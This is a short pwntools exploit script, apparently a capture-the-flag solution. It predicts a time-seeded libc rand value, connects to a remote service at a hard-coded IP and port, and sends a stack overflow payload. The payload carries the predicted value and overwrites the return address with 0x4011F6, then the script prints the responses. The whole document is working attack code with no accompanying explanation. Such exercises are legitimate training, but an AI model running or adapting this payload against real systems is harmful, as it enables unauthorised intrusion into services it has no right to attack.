from pwn import *
from ctypes import CDLL

libc = CDLL("libc.so.6")
libc.srand(libc.time(0))
random = libc.rand()


io = remote("45.76.91.112", 10053)
io.recvuntil("Enter password:")
password = b'A' * 8 + p64(0) + b'A' * 28 + p32(random) + b'A' * 8 + p64(0x4011F6)
io.sendline(password)

while True:
	try:
		# use "readline" from pwntools
		line = io.recvline().decode('ascii')
		print(line)
	except:
		# could not read line => program exited
		break
io.close()

# io.interactive()